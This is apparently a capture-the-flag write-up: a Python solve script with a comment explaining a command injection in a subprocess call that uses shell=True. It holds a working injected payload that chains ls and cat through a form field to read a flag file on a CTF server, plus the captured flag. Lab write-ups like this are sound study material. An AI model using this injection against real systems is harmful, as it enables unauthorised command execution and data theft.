"""
there is a command injection vulnerability in this part of code 

```
result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
```

so we inject some commands
to find that there is a direcory called  we_don_t_do_that_here

and inside it there is the flag 

script bellow:
"""

import requests

BASE_URL = 'http://web.ctf.ingeniums.club:6001/'

data = {
    "keyword": "1cp",
    "fileName": "l;ls -l; ls -l we_don_t_do_that_here;cat we_don_t_do_that_here/flag.txt"
}

res = requests.post(BASE_URL, data=data)

print(res.text)

#ingeniums{cOmMAND_1NJECt10n?_n0t_A_pR0BLeM_F0r_y0u$}